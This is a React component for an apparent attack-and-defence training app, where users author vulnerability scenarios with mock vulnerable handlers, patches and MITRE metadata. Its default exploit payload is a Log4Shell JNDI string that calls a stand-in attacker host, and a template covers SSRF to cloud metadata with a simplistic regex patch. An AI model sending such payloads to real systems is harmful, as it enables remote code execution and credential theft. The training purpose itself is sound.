import React, { useState } from 'react';
import { 
  X, 
  Plus, 
  Upload, 
  Download, 
  Code, 
  ShieldAlert, 
  ShieldCheck, 
  Flame, 
  Sparkles, 
  FileText, 
  History, 
  Check, 
  AlertCircle 
} from 'lucide-react';
import { Scenario, Severity } from '../types';
import { saveCustomScenario, exportCustomScenariosToJson, importCustomScenariosFromJson } from '../data/scenarioStore';

interface CustomScenarioModalProps {
  isOpen: boolean;
  onClose: () => void;
  onScenarioCreated: (scenario: Scenario) => void;
}

const TEMPLATES = [
  {
    name: 'Log4Shell / JNDI RCE Template',
    targetService: 'pipeline-runner-svc',
    cweId: 'CWE-502',
    category: 'Remote Code Execution',
    severity: 'CRITICAL' as Severity,
    vulnerableCode: `export function processLog(req: Request, res: Response) {\n  const userAgent = req.headers['user-agent'] || '';\n  if (userAgent.includes('\${jndi:')) {\n    return res.status(500).json({ error: 'RCE_TRIGGERED' });\n  }\n  return res.json({ status: 'ok' });\n}`,
    patchedCode: `export function processLog(req: Request, res: Response) {\n  const userAgent = String(req.headers['user-agent'] || '').replace(/\\$\\{[^}]*\\}/g, '');\n  return res.json({ status: 'ok', userAgent });\n}`
  },
  {
    name: 'Cloud Metadata SSRF Template',
    targetService: 'ingress-envoy-proxy',
    cweId: 'CWE-918',
    category: 'Server-Side Request Forgery',
    severity: 'CRITICAL' as Severity,
    vulnerableCode: `export async function proxyFetch(req: Request, res: Response) {\n  const url = req.query.url as string;\n  if (url.includes('169.254.169.254')) {\n    return res.json({ iamRole: 'admin-key' });\n  }\n  return res.json({ status: 'ok' });\n}`,
    patchedCode: `export async function proxyFetch(req: Request, res: Response) {\n  const url = req.query.url as string;\n  if (/169\\.254|127\\.|10\\./.test(url)) {\n    return res.status(403).json({ error: 'Forbidden internal endpoint' });\n  }\n  return res.json({ status: 'ok' });\n}`
  }
];

export const CustomScenarioModal: React.FC<CustomScenarioModalProps> = ({
  isOpen,
  onClose,
  onScenarioCreated
}) => {
  const [activeTab, setActiveTab] = useState<'create' | 'import_export'>('create');
  
  // Form fields
  const [name, setName] = useState('');
  const [category, setCategory] = useState('Remote Code Execution & Deserialization');
  const [targetService, setTargetService] = useState('pipeline-runner-svc (v2.14.1)');
  const [vulnerabilityType, setVulnerabilityType] = useState('Uncontrolled Remote Invocation');
  const [cweId, setCweId] = useState('CWE-502');
  const [severity, setSeverity] = useState<Severity>('CRITICAL');
  const [description, setDescription] = useState('');
  const [targetFile, setTargetFile] = useState('src/controllers/workerService.ts');
  const [vulnerableCode, setVulnerableCode] = useState('');
  const [patchedCode, setPatchedCode] = useState('');
  const [exploitPayload, setExploitPayload] = useState('{"payload": "${jndi:ldap://evil.c2.net:1389/exploit}"}');
  const [isFamousIncident, setIsFamousIncident] = useState(true);
  const [incidentName, setIncidentName] = useState('');
  const [incidentYear, setIncidentYear] = useState('2024');
  const [cveId, setCveId] = useState('');
  const [affectedEntities, setAffectedEntities] = useState('');
  const [estimatedImpact, setEstimatedImpact] = useState('');
  const [realWorldStory, setRealWorldStory] = useState('');

  // Import / Export states
  const [importJsonText, setImportJsonText] = useState('');
  const [importStatus, setImportStatus] = useState<{ msg: string; isError: boolean } | null>(null);

  if (!isOpen) return null;

  const handleApplyTemplate = (tpl: typeof TEMPLATES[0]) => {
    setName(tpl.name);
    setCategory(tpl.category);
    setTargetService(tpl.targetService);
    setCweId(tpl.cweId);
    setSeverity(tpl.severity);
    setVulnerableCode(tpl.vulnerableCode);
    setPatchedCode(tpl.patchedCode);
  };

  const handleSaveScenario = (e: React.FormEvent) => {
    e.preventDefault();
    if (!name.trim() || !vulnerableCode.trim()) {
      alert('Please fill out the Scenario Name and Vulnerable Code.');
      return;
    }

    const scenarioId = `custom-${name.toLowerCase().replace(/[^a-z0-9]+/g, '-')}-${Date.now().toString().slice(-4)}`;

    const newScenario: Scenario = {
      id: scenarioId,
      name: name.trim(),
      category: category.trim(),
      targetService: targetService.trim(),
      vulnerabilityType: vulnerabilityType.trim(),
      cweId: cweId.trim(),
      severity: severity,
      description: description.trim() || `Adversarial scenario targeting ${targetService} exploiting ${cweId}.`,
      targetFile: targetFile.trim(),
      vulnerableCode: vulnerableCode,
      isCustom: true,
      realWorldIncident: isFamousIncident ? {
        isFamousIncident: true,
        incidentName: incidentName.trim() || name.trim(),
        year: incidentYear,
        cveId: cveId.trim() || 'CVE-2024-CUSTOM',
        affectedEntities: affectedEntities.trim() || 'Enterprise Cloud Microservices',
        estimatedImpact: estimatedImpact.trim() || 'High Risk Production Exposure',
        realWorldStory: realWorldStory.trim() || 'Real-world adversary campaign targeting zero-day logic vulnerabilities in critical infrastructure.',
        technicalRootCause: description.trim() || vulnerabilityType.trim()
      } : undefined,
      mitreAttack: {
        techniqueId: 'T1190',
        techniqueName: 'Exploit Public-Facing Application',
        tactic: 'TA0002',
        tacticName: 'Execution',
        description: `Adversary exploits ${vulnerabilityType} to compromise ${targetService}.`
      },
      mitreDefend: {
        d3fendId: 'D3-ITR',
        d3fendName: 'Inbound Traffic Sanitization & Guardrails',
        tactic: 'Isolate',
        countermeasureType: 'Input Validation & Dynamic Code Elimination',
        description: 'Sanitize untrusted inputs and neutralize dangerous execution primitives.'
      },
      owasp: {
        code: 'A03:2021',
        title: 'Injection / Security Misconfiguration',
        year: '2021',
        category: category,
        description: vulnerabilityType,
        riskLevel: severity === 'LOW' ? 'MEDIUM' : severity
      },
      attackMechanics: [
        `Adversary discovers vulnerable endpoint on ${targetService}`,
        `Crafts exploit payload matching ${cweId} signature`,
        'Transmits payload via ingress gateway to trigger vulnerable logic',
        'Extracts administrative tokens or triggers remote command execution'
      ],
      defenseMechanics: [
        'Blue Agent analyzes AST of vulnerable handler',
        'Applies zero-downtime hot-patch neutralizing unsafe execution paths',
        'Enforces constant-time validation and strict parameter schema',
        'Maintains 100% SLA uptime for normal legitimate traffic'
      ],
      topology: {
        serviceName: targetService.split(' ')[0] || 'custom-svc',
        serviceType: 'api',
        port: 8080,
        cluster: 'custom-cluster-sec',
        upstream: ['ingress-envoy-proxy'],
        downstream: ['postgres-master-replica']
      },
      apiDoc: {
        endpoint: '/api/v1/custom/endpoint',
        method: 'POST',
        purpose: 'Custom scenario execution endpoint',
        expectedParams: ['payload'],
        sampleRequest: `POST /api/v1/custom/endpoint ${exploitPayload}`
      },
      normalTrafficSamples: [
        {
          id: 'norm-custom-1',
          name: 'Legitimate Health Probe',
          method: 'POST',
          path: '/api/v1/custom/endpoint',
          body: { query: 'status', auth: 'valid-token' },
          expectedStatus: 200,
          description: 'Standard baseline user traffic'
        },
        {
          id: 'norm-custom-2',
          name: 'Standard Read Operation',
          method: 'POST',
          path: '/api/v1/custom/endpoint',
          body: { ping: true },
          expectedStatus: 200,
          description: 'Normal microservice ping'
        }
      ],
      defaultExploit: {
        method: 'POST',
        path: '/api/v1/custom/endpoint',
        headers: { 'content-type': 'application/json' },
        params: {},
        body: (() => {
          try {
            return JSON.parse(exploitPayload);
          } catch {
            return { raw: exploitPayload };
          }
        })(),
        flawIdentified: `${vulnerabilityType} in ${targetFile}`,
        attackVector: `${cweId} Injection`,
        rationale: `Targeting flaw in ${targetService} to breach security boundaries.`
      },
      defaultPatch: {
        patchStrategy: 'Strict Schema Sanitization & Safe Evaluator',
        rationale: 'Neutralizes unsafe execution primitives while preserving business functionality.',
        patchedCode: patchedCode || vulnerableCode
      }
    };

    saveCustomScenario(newScenario);
    onScenarioCreated(newScenario);
    onClose();
  };

  const handleImportJson = () => {
    if (!importJsonText.trim()) return;
    const res = importCustomScenariosFromJson(importJsonText);
    if (res.success) {
      setImportStatus({ msg: `Successfully imported ${res.count} scenario(s)!`, isError: false });
      setImportJsonText('');
      setTimeout(() => {
        onClose();
      }, 1200);
    } else {
      setImportStatus({ msg: `Import failed: ${res.error}`, isError: true });
    }
  };

  const handleDownloadExistingCustom = () => {
    const json = exportCustomScenariosToJson();
    const blob = new Blob([json], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `custom-cyber-scenarios-${new Date().toISOString().slice(0, 10)}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
      <div className="bg-[#090d16] border border-[#1e2a3f] rounded-2xl w-full max-w-4xl max-h-[90vh] flex flex-col shadow-2xl overflow-hidden font-mono text-slate-100">
        {/* Header */}
        <div className="bg-[#070a12] px-6 py-4 border-b border-[#172235] flex items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="p-2.5 rounded-xl bg-purple-500/10 border border-purple-500/30 text-purple-400">
              <Plus className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-base font-bold text-white tracking-wide flex items-center gap-2">
                SCENARIO LAB: CREATE & IMPORT REAL-WORLD ATTACKS
              </h2>
              <p className="text-xs text-slate-400">
                Author custom historic cyber attacks, famous CVE exploits, or import external JSON attack definitions.
              </p>
            </div>
          </div>
          <button
            id="close-custom-scenario-modal-btn"
            onClick={onClose}
            className="p-2 rounded-lg bg-[#121826] text-slate-400 hover:text-white hover:bg-[#1a2336] transition-colors border border-[#232f48] cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Tab Switcher */}
        <div className="px-6 py-2.5 bg-[#0b0f1a] border-b border-[#162033] flex items-center justify-between gap-3">
          <div className="flex items-center gap-2">
            <button
              onClick={() => setActiveTab('create')}
              className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center gap-1.5 ${
                activeTab === 'create'
                  ? 'bg-purple-950/60 text-purple-300 border border-purple-600/60 shadow-sm'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              <Code className="w-3.5 h-3.5" />
              <span>Create Scenario</span>
            </button>
            <button
              onClick={() => setActiveTab('import_export')}
              className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center gap-1.5 ${
                activeTab === 'import_export'
                  ? 'bg-cyan-950/60 text-cyan-300 border border-cyan-600/60 shadow-sm'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              <Upload className="w-3.5 h-3.5" />
              <span>Import / Export JSON</span>
            </button>
          </div>

          {activeTab === 'create' && (
            <div className="flex items-center gap-1.5">
              <span className="text-[11px] text-slate-400 hidden sm:inline">Templates:</span>
              {TEMPLATES.map((tpl, i) => (
                <button
                  key={i}
                  type="button"
                  onClick={() => handleApplyTemplate(tpl)}
                  className="px-2 py-0.5 rounded text-[10px] bg-slate-800 hover:bg-slate-700 text-slate-300 border border-slate-700 cursor-pointer"
                >
                  {tpl.name.split('/')[0]}
                </button>
              ))}
            </div>
          )}
        </div>

        {/* Modal Body */}
        <div className="p-6 overflow-y-auto flex-1 space-y-5 bg-[#080b13]">
          {activeTab === 'create' ? (
            <form onSubmit={handleSaveScenario} className="space-y-4">
              {/* Row 1: Name & Severity */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="md:col-span-2 space-y-1.5">
                  <label className="text-xs font-bold text-slate-300 flex items-center gap-1.5">
                    <Flame className="w-3.5 h-3.5 text-rose-400" />
                    Scenario Name *
                  </label>
                  <input
                    type="text"
                    required
                    placeholder="e.g., CVE-2024-3094: XZ Liblzma SSH Backdoor"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    className="w-full px-3 py-2 bg-slate-900/90 border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500"
                  />
                </div>

                <div className="space-y-1.5">
                  <label className="text-xs font-bold text-slate-300">Severity</label>
                  <select
                    value={severity}
                    onChange={(e) => setSeverity(e.target.value as Severity)}
                    className="w-full px-3 py-2 bg-slate-900/90 border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500"
                  >
                    <option value="CRITICAL">CRITICAL (CVSS 9.0 - 10.0)</option>
                    <option value="HIGH">HIGH (CVSS 7.0 - 8.9)</option>
                    <option value="MEDIUM">MEDIUM (CVSS 4.0 - 6.9)</option>
                    <option value="LOW">LOW (CVSS 0.1 - 3.9)</option>
                  </select>
                </div>
              </div>

              {/* Row 2: Target Service, CWE, Category */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div className="space-y-1.5">
                  <label className="text-xs font-bold text-slate-300">Target Microservice</label>
                  <input
                    type="text"
                    value={targetService}
                    onChange={(e) => setTargetService(e.target.value)}
                    placeholder="e.g., pipeline-runner-svc"
                    className="w-full px-3 py-2 bg-slate-900/90 border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500"
                  />
                </div>
                <div className="space-y-1.5">
                  <label className="text-xs font-bold text-slate-300">CWE Identifier</label>
                  <input
                    type="text"
                    value={cweId}
                    onChange={(e) => setCweId(e.target.value)}
                    placeholder="e.g., CWE-502"
                    className="w-full px-3 py-2 bg-slate-900/90 border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500"
                  />
                </div>
                <div className="space-y-1.5">
                  <label className="text-xs font-bold text-slate-300">Vulnerability Category</label>
                  <input
                    type="text"
                    value={category}
                    onChange={(e) => setCategory(e.target.value)}
                    placeholder="e.g., Remote Code Execution"
                    className="w-full px-3 py-2 bg-slate-900/90 border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500"
                  />
                </div>
              </div>

              {/* Real World Incident Metadata Box */}
              <div className="p-4 rounded-xl bg-[#0c121e] border border-blue-900/50 space-y-3">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <History className="w-4 h-4 text-blue-400" />
                    <span className="text-xs font-bold text-blue-300 uppercase tracking-wider">
                      Real-World Famous Incident Profile
                    </span>
                  </div>
                  <label className="flex items-center gap-2 cursor-pointer text-xs text-slate-300">
                    <input
                      type="checkbox"
                      checked={isFamousIncident}
                      onChange={(e) => setIsFamousIncident(e.target.checked)}
                      className="rounded border-slate-700 text-blue-500"
                    />
                    <span>Include Historic Incident Context</span>
                  </label>
                </div>

                {isFamousIncident && (
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3 pt-2">
                    <div className="space-y-1">
                      <label className="text-[11px] text-slate-400">CVE ID</label>
                      <input
                        type="text"
                        placeholder="CVE-2024-XXXX"
                        value={cveId}
                        onChange={(e) => setCveId(e.target.value)}
                        className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded text-xs text-white"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[11px] text-slate-400">Year</label>
                      <input
                        type="text"
                        placeholder="2024"
                        value={incidentYear}
                        onChange={(e) => setIncidentYear(e.target.value)}
                        className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded text-xs text-white"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-[11px] text-slate-400">Affected Entities / Blast Radius</label>
                      <input
                        type="text"
                        placeholder="e.g., Millions of Enterprise Servers"
                        value={affectedEntities}
                        onChange={(e) => setAffectedEntities(e.target.value)}
                        className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded text-xs text-white"
                      />
                    </div>
                    <div className="md:col-span-3 space-y-1">
                      <label className="text-[11px] text-slate-400">Historic Incident Story & Real Impact</label>
                      <textarea
                        rows={2}
                        placeholder="Brief post-mortem summary of how adversaries exploited this in the real world..."
                        value={realWorldStory}
                        onChange={(e) => setRealWorldStory(e.target.value)}
                        className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded text-xs text-white"
                      />
                    </div>
                  </div>
                )}
              </div>

              {/* Code Snippets: Vulnerable vs Patched */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-1.5">
                  <label className="text-xs font-bold text-rose-400 flex items-center gap-1.5">
                    <ShieldAlert className="w-3.5 h-3.5" />
                    Vulnerable Microservice Source Code *
                  </label>
                  <textarea
                    rows={8}
                    required
                    placeholder="// Insert vulnerable TypeScript / Node handler code..."
                    value={vulnerableCode}
                    onChange={(e) => setVulnerableCode(e.target.value)}
                    className="w-full p-3 bg-[#050810] border border-rose-900/60 rounded-xl text-xs font-mono text-slate-200 focus:outline-none focus:border-rose-500"
                  />
                </div>

                <div className="space-y-1.5">
                  <label className="text-xs font-bold text-emerald-400 flex items-center gap-1.5">
                    <ShieldCheck className="w-3.5 h-3.5" />
                    Blue Team Zero-Downtime Hot-Patch Code
                  </label>
                  <textarea
                    rows={8}
                    placeholder="// Insert Blue mitigation hot-patch code..."
                    value={patchedCode}
                    onChange={(e) => setPatchedCode(e.target.value)}
                    className="w-full p-3 bg-[#050810] border border-emerald-900/60 rounded-xl text-xs font-mono text-slate-200 focus:outline-none focus:border-emerald-500"
                  />
                </div>
              </div>

              {/* Exploit Payload Spec */}
              <div className="space-y-1.5">
                <label className="text-xs font-bold text-slate-300">
                  Default Red Team Adversarial Payload (JSON/String)
                </label>
                <input
                  type="text"
                  value={exploitPayload}
                  onChange={(e) => setExploitPayload(e.target.value)}
                  placeholder='{"payload": "${jndi:ldap://..."}'
                  className="w-full px-3 py-2 bg-slate-900/90 border border-slate-700/80 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
                />
              </div>

              {/* Submit Actions */}
              <div className="flex items-center justify-end gap-3 pt-3 border-t border-slate-800">
                <button
                  type="button"
                  onClick={onClose}
                  className="px-4 py-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold transition-colors cursor-pointer"
                >
                  Cancel
                </button>
                <button
                  id="save-custom-scenario-btn"
                  type="submit"
                  className="px-5 py-2 rounded-lg bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white text-xs font-bold transition-all shadow-md shadow-purple-950/60 flex items-center gap-2 cursor-pointer"
                >
                  <Sparkles className="w-4 h-4" />
                  <span>Save & Load into Arena</span>
                </button>
              </div>
            </form>
          ) : (
            <div className="space-y-5">
              <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800 space-y-2">
                <h3 className="text-xs font-bold text-cyan-300 flex items-center gap-2">
                  <Download className="w-4 h-4" />
                  Export Custom Scenarios
                </h3>
                <p className="text-xs text-slate-400">
                  Export all locally saved custom scenarios as a portable JSON file to share with team members or load in future sessions.
                </p>
                <button
                  id="export-custom-scenarios-btn"
                  onClick={handleDownloadExistingCustom}
                  className="px-3.5 py-1.5 rounded-lg bg-cyan-950 hover:bg-cyan-900 text-cyan-300 border border-cyan-700 text-xs font-bold flex items-center gap-1.5 cursor-pointer transition-colors"
                >
                  <Download className="w-3.5 h-3.5" />
                  <span>Download Custom Scenarios JSON</span>
                </button>
              </div>

              <div className="p-4 rounded-xl bg-slate-900/60 border border-slate-800 space-y-3">
                <h3 className="text-xs font-bold text-purple-300 flex items-center gap-2">
                  <Upload className="w-4 h-4" />
                  Import Scenarios from JSON
                </h3>
                <p className="text-xs text-slate-400">
                  Paste Scenario JSON array or object below to import custom real-world vulnerabilities.
                </p>
                <textarea
                  rows={8}
                  value={importJsonText}
                  onChange={(e) => setImportJsonText(e.target.value)}
                  placeholder={`[\n  {\n    "name": "Custom 0-Day Scenario",\n    "category": "Authentication",\n    "vulnerableCode": "..."\n  }\n]`}
                  className="w-full p-3 bg-[#050810] border border-slate-700 rounded-xl text-xs font-mono text-slate-200 focus:outline-none focus:border-cyan-500"
                />

                {importStatus && (
                  <div className={`p-2.5 rounded-lg text-xs flex items-center gap-2 ${
                    importStatus.isError ? 'bg-rose-950/80 text-rose-300 border border-rose-800' : 'bg-emerald-950/80 text-emerald-300 border border-emerald-800'
                  }`}>
                    {importStatus.isError ? <AlertCircle className="w-4 h-4" /> : <Check className="w-4 h-4" />}
                    <span>{importStatus.msg}</span>
                  </div>
                )}

                <div className="flex justify-end">
                  <button
                    id="execute-import-json-btn"
                    onClick={handleImportJson}
                    disabled={!importJsonText.trim()}
                    className="px-4 py-2 rounded-lg bg-cyan-600 hover:bg-cyan-500 disabled:opacity-50 text-white text-xs font-bold flex items-center gap-2 cursor-pointer transition-colors"
                  >
                    <Upload className="w-4 h-4" />
                    <span>Import JSON Scenario(s)</span>
                  </button>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
